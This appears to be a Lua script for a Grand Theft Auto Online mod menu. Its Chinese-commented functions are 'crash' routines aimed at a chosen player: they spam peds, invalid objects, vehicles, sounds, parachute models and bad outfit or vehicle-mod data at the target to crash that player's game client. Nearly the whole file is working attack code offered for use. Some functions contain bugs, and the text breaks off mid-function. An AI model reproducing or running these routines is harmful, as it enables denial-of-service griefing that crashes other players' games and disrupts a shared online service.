--奥特曼崩V1
function aotemanv1(PlayerID)
	local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_TWO"),TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
end
--奥特曼崩V2
function aotemanv2(PlayerID)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ZERO"),TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
	end
--奥特曼崩V3
function aotemanv3(PlayerID)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ONE"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
	end
    
--碎片崩溃V1
function v1_frag(PlayerID)
    BlockSyncs(PlayerID, function()
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        util.yield(1000)
        entities.delete_by_handle(object)
    end)
end
--碎片崩溃V2
function v2_frag(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    util.yield(10)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    return
end
end
--泡泡糖
function LilYachty(PlayerID)
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
		local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
        BlockSyncs(PlayerID, function()
		util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
            PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
            PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
            util.yield(50)
            local pos = players.get_position(PlayerID)
            pos.z += 300
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) == 0
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            util.yield(50)
            TASK.CLEAR_PED_TASKS(user)
            util.yield(50)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
            pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
            PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
            pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x,old_pos.y,old_pos.z, false, false)
        end)
    end
--懂哥崩
function dongge(PlayerID)
    notification("I'll try to convince them to leave :) ")
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(20)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    util.yield(500)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(1000)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
	end
--大自然崩
function natural(PlayerID)
local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(PlayerID, function() 
            util.yield(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
        end)
    end
--美杜莎崩溃
function MDS(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    plauuepos.x = plauuepos.x + 5
    plauuepos.z = plauuepos.z + 5
    local hunter = {}
    for i = 1 ,3 do
        for n = 0,120 do
            hunter[n] = CreateVehicle(1077420264,plauuepos,0)
            util.yield(0)
            ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
            util.yield(0)
            VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
        end
        util.yield(190)
        for i = 1,#hunter do
            if hunter[i] ~= nil then
                entities.delete_by_handle(hunter[i])
            end
        end
    end
    notification("Finished!")
	menu.trigger_commands("anticrashcam off")
    hunter = nil
    plauuepos = nil	
end
--瘟疫崩溃
function wenyi(PlayerID)
for i = 1, 10 do
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        STREAMING.REQUEST_MODEL(-930879665)
        util.yield(10)
        STREAMING.REQUEST_MODEL(3613262246)
        util.yield(10)
        STREAMING.REQUEST_MODEL(452618762)
        util.yield(10)
        while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
        while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
        while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
        local a1 = entities.create_object(-930879665, cord)
        util.yield(10)
        local a2 = entities.create_object(3613262246, cord)
        util.yield(10)
        local b1 = entities.create_object(452618762, cord)
        util.yield(10)
        local b2 = entities.create_object(3613262246, cord)
        util.yield(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
        util.yield(10)
        end
        if SE_Notifications then
            notification("Finished.")
        end
	end
--声音崩溃V1
function soundcrashv1(PlayerID)
local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
            end
            util.yield(0)
        end
    end 
--声音崩溃V2
function soundcrashv2(PlayerID)
local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
            end
            util.yield()
        end	
    end
--无效模型崩溃
function wxcrash(PlayerID)
menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        util.yield(10)
    end
    util.yield(2000)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza3)
    entities.delete_by_handle(Object_pizza4)
    menu.trigger_commands("anticrashcam off")
	end
--5G崩溃
function five5crash(PlayerID)
              local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
              local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
              pos.z = pos.z + 10
              veh = entities.get_all_vehicles_as_handles()
              
            for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
            end
        end
--6G崩溃
        function six6crash(PlayerID)
            local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
            pos.z = pos.z + 5
            veh = entities.get_all_vehicles_as_handles()
            
          for i = 1, #veh do
          NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
          ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 777)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 17, 888)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
          end
      end
--大鸡巴崩溃
function dajibab(PlayerID)
                local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local Object_jb1 = CreateObject(0xD75E01A6, TargetPlayerPos)
            local Object_jb2 = CreateObject(0x675D244E, TargetPlayerPos)
            local Object_jb3 = CreateObject(0x799B48CA, TargetPlayerPos)
            local Object_jb4 = CreateObject(0x68E49D4D, TargetPlayerPos)
            local Object_jb5 = CreateObject(0x66F34017, TargetPlayerPos)
            local Object_jb6 = CreateObject(0xDE1807BB, TargetPlayerPos)
            local Object_jb7 = CreateObject(0xC4C9551E, TargetPlayerPos)
            local Object_jb8 = CreateObject(0xCF37BA1F, TargetPlayerPos)
            local Object_jb9 = CreateObject(0xB69AD9F8, TargetPlayerPos)
            local Object_jb10 = CreateObject(0x5D750529, TargetPlayerPos)
            local Object_jb11 = CreateObject(0x1705D85C, TargetPlayerPos)
            for i = 0, 1000 do 
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb7, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb8, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb9, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb10, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb11 ,TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                util.yield(10)
            end
            util.yield(5500)
            entities.delete_by_handle(Object_jb1)
            entities.delete_by_handle(Object_jb2)
            entities.delete_by_handle(Object_jb3)
            entities.delete_by_handle(Object_jb4)
            entities.delete_by_handle(Object_jb5)
            entities.delete_by_handle(Object_jb6)
            entities.delete_by_handle(Object_jb7)
            entities.delete_by_handle(Object_jb8)
            entities.delete_by_handle(Object_jb9)
            entities.delete_by_handle(Object_jb10)
            entities.delete_by_handle(Object_jb11)
end
--导弹车崩溃V1
function daodanchev1(PlayerID)
menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        SpawnedVehicleList = { };
        for i = 1, 65 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
            util.yield(50)
        end
        util.yield(5000)
        for i = 1, 65 do
            entities.delete_by_handle(SpawnedVehicleList[i])
        end
        menu.trigger_commands("anticrashcam off")
		end
--导弹车崩溃V2
function daodanchev2(PlayerID)
menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        TargetPlayerPos.y = TargetPlayerPos.y + 1050
        SpawnedVehicleList1 = { };
        for i = 1, 60 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList1[i])
        end

        util.yield(1000)
        SpawnedVehicleList2 = { };
        for i = 1, 50 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 50 do
            entities.delete_by_handle(SpawnedVehicleList2[i])
        end
        menu.trigger_commands("anticrashcam off")
    end
--无效外观
function BadOutfitCrashV1(PlayerID)
menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
    local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    for i = 0, 500 do
        PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
        ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
        util.yield(10)
    end
    entities.delete_by_handle(Spawned_Mike)
    menu.trigger_commands("anticrashcam off")
end
--无效载具配件
function BadNetVehicleCrashV2(PlayerID)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834,1591739866}
    local vehicles = {}
    for i = 1, 50 do
        util.create_thread(function()
            request_model_load(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(PlayerID))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield(2000)
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
--单崩黄昏
function HHHM(PlayerID)
	for pedp_crash = 2 , 6 do
	pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    util.yield(5000)
	for i = 0, 100  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
			util.yield(10)
		end
        util.yield(2000)
        entities.delete_by_handle(dune)
        entities.delete_by_handle(dune1)
        entities.delete_by_handle(barracks)
        entities.delete_by_handle(barracks1)
        entities.delete_by_handle(dunecar)
        entities.delete_by_handle(dunecar1)
        entities.delete_by_handle(dunecar2)
        entities.delete_by_handle(barracks3)
        entities.delete_by_handle(barracks31)
    end
end
--拖车崩溃
function tuocheb(PlayerID)
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
